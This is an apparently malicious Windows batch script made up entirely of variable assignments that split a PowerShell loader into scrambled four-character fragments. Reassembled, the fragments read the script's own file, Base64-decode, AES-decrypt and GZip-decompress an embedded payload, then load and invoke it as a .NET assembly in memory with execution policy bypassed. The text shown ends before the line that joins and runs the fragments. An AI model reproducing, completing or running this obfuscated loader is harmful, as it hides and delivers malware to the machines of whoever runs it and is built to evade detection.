@echo off
set "vFYMyQNLnf=oin "
set "aRmqHiJzhA=PTtG"
set "CZreMWKGDP=LyVv"
set "VdwoHCdEuj=hVT "
set "CXcUcFvvda=..-1"
set "DFlIQvvalf=LyVv"
set "yOLayYSQFM=.Cre"
set "DsoCmntaFp=New-"
set "ABGpqwlkxx=LZb."
set "yLqGLeqPPl=;$oG"
set "bavdIbmblv=('Tg"
set "kfCRLMNorv=);$o"
set "ILaoMwmZdI=Fina"
set "CEPeJlQWzW='0Pg"
set "ApbmqKjOOE=VjMu"
set "SYHqfTjDic=$aNh"
set "FPSHjBbIuc=pose"
set "bLaXneGMDq=Obje"
set "gIHMiWzmcN= if "
set "CiudVQfWUy=esMa"
set "ESWvqsTAui=[IO."
set "wnyfywjsmM=KYr "
set "cUolgmXVVE=hVT."
set "IWNqthVVhA='txe"
set "OtLxVwkdYP=g = "
set "aAvEpmZZYf=esaB"
set "AVQIRqMYHc=Mode"
set "wmVSSMRbIL== $E"
set "gMsNjVgDcc=zrgl"
set "HAbrfMuQDT=ose("
set "TnFvOdlDkm=gjYA"
set "wQExISIEft=daeR"
set "oEmVDuysUO=em.I"
set "izMOzMEBKY=[-1."
set "rMCVmHIRKv='[-1"
set "jFGjpkdobj=]::N"
set "WdQVgXaxSt=, (,"
set "bNSUzexiom=ddin"
set "VygxJNSlCG=$ELy"
set "PoSUtmOTUJ=).Sp"
set "PeXClIXYNu=ke($"
set "abMELXxgIr= [Sy"
set "CFUYQhFBvT='[-1"
set "pwrLXIGmGs=3); "
set "sTERmQSuyu=Vv.I"
set "QMoYVNRiQC=ewLi"
set "qJqYCukWHH=, $v"
set "owSrCGmimR=ert]"
set "MKgDbmcYhi=ddin"
set "QYANlebwdK=Stre"
set "ANNtcTsgYO=RmAx"
set "qdrmaBurYK= New"
set "khYfjFBTvb=bjec"
set "YQMyAWYPUJ=-nop"
set "kRePkIsqDL=vHFW"
set "DqPtTNhldk=flec"
set "TBVflbQVAN=null"
set "WPLmSIVkFi=$sVj"
set "iHEqWSIVKp=ay()"
set "SdcGLIBVuU=ptor"
set "NDHbZCEssC=);$z"
set "CrXppIprgr=gfh "
set "CErpemfPhF=v.Pa"
set "HNVfOwwzeg=morF"
set "dtRPazAPrH=File"
set "JBLSXqaTza=ach "
set "eOblrRJpan=m.Re"
set "gRatnwpzGq=gnir"
set "RRJcImLjCN=ew-O"
set "fBRXuDIrZT=nirt"
set "labDTmJIvZ=tem."
set "oJiMbdiTRU=ode]"
set "OfFQgYfcmu=yste"
set "yIUbxQbjOe=-joi"
set "DhpDDKLaci= '')"
set "bssoGnqSPa=.GZi"
set "TFkrbvesuw=pres"
set "ZLJZcnSGnJ=h.En"
set "KqmvEKTiIt=Bmor"
set "TljpxhGohD=HFWp"
set "aODFeKRjUY=ion."
set "QIwyzWffps=ress"
set "fMixmrTHvH=]::("
set "WCkWtSfMsS=stem"
set "YLdrlAtqhx=lBlo"
set "XIKmdtfUzs=rofi"
set "KiFqgJAyZT=m.IO"
set "BmFgLMnkMP=ptog"
set "NKQJYsBZLM=]::("
set "WIxiPnQehU=Conv"
set "IHOBSSoiqd=vHFW"
set "XxubMclGhO=ct S"
set "RnlYmHoYGo=.Ass"
set "kiZWfszeCM=;$IK"
set "YMDmgOuTIi=LyVv"
set "skwjuLMlBi=yTo("
set "koSSBIBtmj=BC;$"
set "UymbkdEhlE=pStr"
set "tsEqiHxVcf=rans"
set "KSkXWcTbvk=);$E"
set "MbZXojSTtI=Secu"
set "RkliHZloGi=PKCS"
set "eyQnyVlRow=dj0C"
set "XGwrzWblrX=ct S"
set "uyStgIivOo=p, 0"
set "dchfCcyLxD=am;$"
set "oykRGcheaz=.Cry"
set "AXSnRfxHmx=);$E"
set "deQlYDybnX=embl"
set "KetwGNxzwv=stem"
set "CMlGxwnnzq=tem."
set "wTutOVmDMH=and "
set "sIFVWnXArI=join"
set "PbEBEKxHMw=]::C"
set "fZGNvLIEAc=k; }"
set "geaTWgZVaR=Secu"
set "ZPdTCRXjuF=rtS4"
set "tcGNlvcbxs=vHFW"
set "JOymanbTnT=m.IO"
set "OBSGbMPMbN=iron"
set "rODVMfIseP=6esa"
set "QzPnNeAFQH=S46e"
set "pigTdLlzJn=$sVj"
set "PIUvuvcFuA=A) {"
set "lXmUyUvHah=rgle"
set "uKmPqvApKn=1..-"
set "ZaRpdWGWfv=stem"
set "ZKtyGjZhaz=sion"
set "bbQrVvjwKv=rity"
set "JQPXtpCYrU=y.Ci"
set "yeWBDBQxQN=s75K"
set "aFYVdnzBOc=y]::"
set "gnzIQPcVDz==');"
set "vpjYfNuQyB== [S"
set "KrBJTFXDOp=[Sys"
set "wYZLYOfDyj=rity"
set "JJIxjKGdic=::('"
set "ZGIHwdZRSl=d;$E"
set "bVoWhQtWBJ=PxEW"
set "FeHKHFBTGS=xoKY"
set "zqQOXJoAFR=join"
set "toEyzkrKrC=tryP"
set "fntZmruAGP=e]::"
set "UnuhKiRcfh=yste"
set "xOgvULwucO=p = "
set "wnBdHfCbPN=ck($"
set "sEcoAfVZGt=YxVw"
set "hOkoEFceeC=.-16"
set "OeFbCOAqix=vert"
set "CJxClXpbKL=.Cop"
set "MzZkhBOHVf=Disp"
set "xJZIKtvtnQ= = N"
set "iBpOSCWGJs=.Com"
set "sAGYfPaglQ=trea"
set "IorGfCubTp=ect "
set "xBpwbKwmad=)))"
set "DHNlxgyNIL=oint"
set "cjmuAUWVRZ=.Mod"
set "HoUOjcUMIY=('%~f0'"
set "qtdvjqYjxf=)) {"
set "SCXmDPOrwS=urit"
set "TXnItcotAJ=();$"
set "VGzCJumFmf=ecry"
set "QneJWrMfuQ=[Sys"
set "nGaKbQcWLd='')("
set "ShrbUgRcLI=pose"
set "UbwVtHdWEH=();$"
set "iIyRTyhQhI=eam("
set "mDIGjaAcAN=$zrg"
set "ERixSwHlZN=.Dis"
set "MlHDUcGEIM=ring"
set "HPUdMMHhoG=;$aN"
set "vZgutCifwN=Mu.T"
set "tsoPJoSTLX=dA ="
set "RjRZTjvuvf=in $"
set "eMHvEvgiLb=[Sys"
set "YbQBXOoSeP=e = "
set "uXIPoDoAEj=] -j"
set "idMvdYvhWY=.Len"
set "zUKNVFxxzk=brea"
set "QaORzjifBf= = $"
set "ikgRSuDEyA=le.D"
set "nTjbvgpvTM=L4Yi"
set "ZcaIKMYITW=Disp"
set "YPBbcmVCxw=-joi"
set "EcaRNOhJbn=tS46"
set "nvZVmYpcMi=n ''"
set "qejhMiSgzU=nage"
set "SRPrhDXHdO=.Con"
set "cpSvOXzcyI=ment"
set "dqjjXyHMbr=;$VR"
set "IMACGFCwVw=Comp"
set "FHvzVMAzJc=se()"
set "RqRYpOXXNy=eMVs"
set "hsxISAwxBt=mory"
set "cYeiZhHkVA=l5E7"
set "PViVAtORSW=Wp);"
set "rtEyIdilFu=IKLZ"
set "JFlETkwbEV=[Env"
set "gfSVpsmCmU=zHhH"
set "XNTwYVlcvr=VRgf"
set "HzgtoaobJZ=('%*'"
set "jzKhqSrqIA=1] -"
set "NdjfnAWTLb=raph"
set "kGJZrCSWgt=.Dis"
set "UVCbBfqUgW= = $"
set "nCuCXjovFx=KYr."
set "kDxuTIOlDO=)($L"
set "otnALTByvp=comp"
set "GMmiAPAIXn=le  "
set "UrkHGKOMXL=GhSk"
set "KHHcpPzvsk=V = "
set "mcdsFQYjDy=t Sy"
set "QnUUuDTROj=$vHF"
set "dGaaIkpeEf=gMod"
set "fTnTwmEoGd= [st"
set "WBRRcCJZBN=LyVv"
set "wDmydtpHej=m(, "
set "EKzJwShaZb=bypa"
set "nJqLqksTal=pher"
set "DzndMeEFKz=.IO."
set "UdEPApQEpl=Wp ="
set "IvIEMWwyWt=ress"
set "DEHRsEluJr=..-1"
set "gtRACOaggd=ELyV"
set "ulMZOJaywY=form"
set "uJjSKFgZSi=::De"
set "OGGHDQeWte=yste"
set "HzJVACUMMY=$SjY"
set "ffJzFighTR=grap"
